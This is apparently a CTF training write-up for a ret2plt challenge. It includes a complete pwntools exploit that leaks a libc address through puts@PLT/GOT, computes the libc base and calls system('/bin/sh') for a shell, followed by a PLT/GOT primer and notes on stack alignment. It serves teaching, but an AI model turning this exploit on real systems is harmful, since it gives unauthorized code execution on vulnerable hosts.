# Challenge 10: Ret2PLT

## Difficulty: Medium-Hard

## Vulnerability Type: ROP + PLT/GOT Exploitation

## Description
This challenge requires leaking libc addresses via GOT, calculating libc base, and then calling system(). Classic ret2plt technique.

## Protections
- **NX**: Enabled
- **PIE**: Disabled (binary at fixed address)
- **Canary**: Disabled
- **RELRO**: Partial (GOT writable)
- **ASLR**: Enabled (libc randomized)

## Vulnerability Analysis

### No Libc Leak Given
Unlike challenge 03, this doesn't leak libc directly. We need to leak it ourselves.

### Multiple Interactions Needed
We need to:
1. Leak a libc address from GOT
2. Return to vuln() to exploit again
3. Call system("/bin/sh")

## Exploitation Strategy

### Stage 1: Leak Libc Address
Use puts() to print a GOT entry:
```python
# ROP chain 1: puts(puts@GOT) then return to vuln()
payload1 = b'A' * offset
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])     # Argument: address to print
payload1 += p64(elf.plt['puts'])     # Call puts() to leak
payload1 += p64(elf.symbols['vuln']) # Return to vuln for stage 2
```

### Stage 2: Call system("/bin/sh")
After leaking, calculate libc base and call system:
```python
# Receive leaked puts address
puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = puts_leak - libc.symbols['puts']

# ROP chain 2: system("/bin/sh")
payload2 = b'A' * offset
payload2 += p64(ret)  # Stack alignment
payload2 += p64(pop_rdi)
payload2 += p64(next(libc.search(b'/bin/sh')))
payload2 += p64(libc.symbols['system'])
```

### Complete Exploit
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./challenge')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.binary = elf

if args.REMOTE:
    p = remote('localhost', 9010)
else:
    p = process('./challenge')

# Find gadgets
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

log.info(f"pop rdi: {hex(pop_rdi)}")
log.info(f"puts@PLT: {hex(elf.plt['puts'])}")
log.info(f"puts@GOT: {hex(elf.got['puts'])}")

# Stage 1: Leak libc
offset = 108

payload1 = b'A' * offset
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])     # puts@GOT address
payload1 += p64(elf.plt['puts'])     # Call puts(puts@GOT)
payload1 += p64(elf.symbols['vuln']) # Return to vuln

p.sendafter(b'payload: ', payload1)

# Receive leak
p.recvline()  # Skip the "Ret2PLT" banner on return
p.recvuntil(b'payload: ')
puts_leaked = u64(p.recvline().strip().ljust(8, b'\x00'))

# Calculate libc base
libc.address = puts_leaked - libc.symbols['puts']
log.info(f"Puts leaked: {hex(puts_leaked)}")
log.info(f"Libc base: {hex(libc.address)}")
log.info(f"System: {hex(libc.symbols['system'])}")

# Stage 2: Call system("/bin/sh")
bin_sh = next(libc.search(b'/bin/sh'))

payload2 = b'A' * offset
payload2 += p64(ret)  # Stack alignment for system()
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(libc.symbols['system'])

p.sendline(payload2)
p.interactive()
```

## PLT and GOT Primer

### PLT (Procedure Linkage Table)
- Fixed addresses for calling library functions
- Jumps to addresses stored in GOT

### GOT (Global Offset Table)
- Contains actual addresses of library functions
- Populated at runtime (lazy binding)
- Can be read to leak libc addresses

### Why This Works
1. `puts@PLT` is at a fixed address (no PIE)
2. `puts@GOT` contains the real libc address of puts
3. We can call `puts@PLT(puts@GOT)` to print the address
4. From one libc address, we calculate the base
5. Now we know where system() and "/bin/sh" are

## Automated Detection
- **No Direct Leak**: Program doesn't print libc addresses
- **PLT Functions Available**: Can call puts/printf to leak
- **GOT Readable**: Can pass GOT addresses as arguments
- **Return to Vuln**: Function can be called multiple times
- **Strategy**: Leak libc via PLT/GOT, calculate base, ret2libc

## Important Notes

### Stack Alignment
System() requires 16-byte stack alignment. Add an extra `ret` gadget if needed:
```python
payload += p64(ret)  # Align stack
payload += p64(pop_rdi)
# ...
```

### Libc Version
Offsets differ between libc versions. For remote exploits, you need to:
1. Leak multiple functions
2. Use libc database (libc.blukat.me)
3. Or receive the libc.so.6 file from organizers

## Learning Objectives
- PLT/GOT exploitation
- Multi-stage ROP attacks
- Libc address leaking
- Return-to-function techniques
- Lazy binding understanding
